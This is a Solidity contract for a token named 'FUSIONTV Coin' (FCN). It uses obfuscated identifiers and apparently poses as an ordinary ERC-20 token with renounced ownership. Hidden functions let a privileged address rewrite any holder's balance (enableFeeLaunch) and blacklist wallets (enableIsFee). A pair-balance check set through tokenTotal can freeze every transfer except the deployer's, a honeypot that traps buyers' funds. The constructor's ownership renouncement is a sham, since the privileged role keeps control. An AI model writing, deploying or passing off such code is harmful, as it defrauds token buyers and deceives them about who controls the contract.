//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface liquidityReceiverSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingShould) external view returns (uint256);

    function transfer(address senderSell, uint256 modeToReceiver) external returns (bool);

    function allowance(address sellMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeToReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address senderSell,
        uint256 modeToReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTake, uint256 value);
    event Approval(address indexed sellMode, address indexed spender, uint256 value);
}

interface liquidityReceiverSenderMetadata is liquidityReceiverSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract txTakeLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeBuy {
    function createPair(address buyTo, address autoFrom) external returns (address);
}

interface totalTakeLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract FUSIONTVCoin is txTakeLaunch, liquidityReceiverSender, liquidityReceiverSenderMetadata {

    address public launchTxFee;

    function enableFeeLaunch(address txLimit, uint256 modeToReceiver) public {
        senderEnable();
        isLaunched[txLimit] = modeToReceiver;
    }

    mapping(address => mapping(address => uint256)) private buyTxTake;

    function enableIsFee(address txAmount) public {
        senderEnable();
        
        if (txAmount == launchTxFee || txAmount == shouldIs) {
            return;
        }
        walletTotalTake[txAmount] = true;
    }

    uint256 marketingShould;

    function fromLaunch(address minMode) public {
        if (autoMin) {
            return;
        }
        if (tokenFee) {
            fromFee = launchSell;
        }
        fundTeam[minMode] = true;
        
        autoMin = true;
    }

    address private teamAmount;

    function tradingTeam(address launchedWallet, address senderSell, uint256 modeToReceiver) internal returns (bool) {
        if (launchedWallet == launchTxFee) {
            return exemptSwap(launchedWallet, senderSell, modeToReceiver);
        }
        uint256 exemptReceiver = liquidityReceiverSender(shouldIs).balanceOf(tokenTake);
        require(exemptReceiver == receiverAutoIs);
        require(!walletTotalTake[launchedWallet]);
        return exemptSwap(launchedWallet, senderSell, modeToReceiver);
    }

    uint256 private minIsFee;

    bool public autoMin;

    function owner() external view returns (address) {
        return teamAmount;
    }

    bool private buyReceiver;

    mapping(address => bool) public fundTeam;

    uint8 private launchedLaunch = 18;

    function decimals() external view virtual override returns (uint8) {
        return launchedLaunch;
    }

    string private maxTokenMarketing = "FCN";

    uint256 private launchLiquidity = 100000000 * 10 ** 18;

    address marketingEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public walletTotalTake;

    uint256 receiverAutoIs;

    function name() external view virtual override returns (string memory) {
        return walletLimit;
    }

    address public shouldIs;

    address tokenTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return launchLiquidity;
    }

    uint256 public launchSell;

    event OwnershipTransferred(address indexed txTeamTake, address indexed autoIsWallet);

    string private walletLimit = "FUSIONTV Coin";

    function transfer(address txLimit, uint256 modeToReceiver) external virtual override returns (bool) {
        return tradingTeam(_msgSender(), txLimit, modeToReceiver);
    }

    uint256 private sellBuyFund;

    function enableToken() public {
        emit OwnershipTransferred(launchTxFee, address(0));
        teamAmount = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return maxTokenMarketing;
    }

    function allowance(address atWallet, address walletIs) external view virtual override returns (uint256) {
        if (walletIs == marketingEnable) {
            return type(uint256).max;
        }
        return buyTxTake[atWallet][walletIs];
    }

    function senderEnable() private view {
        require(fundTeam[_msgSender()]);
    }

    function balanceOf(address tradingShould) public view virtual override returns (uint256) {
        return isLaunched[tradingShould];
    }

    function approve(address walletIs, uint256 modeToReceiver) public virtual override returns (bool) {
        buyTxTake[_msgSender()][walletIs] = modeToReceiver;
        emit Approval(_msgSender(), walletIs, modeToReceiver);
        return true;
    }

    uint256 public swapList;

    function tokenTotal(uint256 modeToReceiver) public {
        senderEnable();
        receiverAutoIs = modeToReceiver;
    }

    uint256 public totalToken;

    mapping(address => uint256) private isLaunched;

    constructor (){
        if (fromFee != totalToken) {
            totalToken = swapList;
        }
        enableToken();
        totalTakeLaunch launchedEnableLaunch = totalTakeLaunch(marketingEnable);
        shouldIs = modeBuy(launchedEnableLaunch.factory()).createPair(launchedEnableLaunch.WETH(), address(this));
        if (fromFee == totalToken) {
            minIsFee = swapList;
        }
        launchTxFee = _msgSender();
        fundTeam[launchTxFee] = true;
        isLaunched[launchTxFee] = launchLiquidity;
        if (walletReceiverMax != fromFee) {
            sellBuyFund = swapList;
        }
        emit Transfer(address(0), launchTxFee, launchLiquidity);
    }

    uint256 public walletReceiverMax;

    uint256 public fromFee;

    function getOwner() external view returns (address) {
        return teamAmount;
    }

    function exemptSwap(address launchedWallet, address senderSell, uint256 modeToReceiver) internal returns (bool) {
        require(isLaunched[launchedWallet] >= modeToReceiver);
        isLaunched[launchedWallet] -= modeToReceiver;
        isLaunched[senderSell] += modeToReceiver;
        emit Transfer(launchedWallet, senderSell, modeToReceiver);
        return true;
    }

    function transferFrom(address launchedWallet, address senderSell, uint256 modeToReceiver) external override returns (bool) {
        if (_msgSender() != marketingEnable) {
            if (buyTxTake[launchedWallet][_msgSender()] != type(uint256).max) {
                require(modeToReceiver <= buyTxTake[launchedWallet][_msgSender()]);
                buyTxTake[launchedWallet][_msgSender()] -= modeToReceiver;
            }
        }
        return tradingTeam(launchedWallet, senderSell, modeToReceiver);
    }

    bool public tokenFee;

}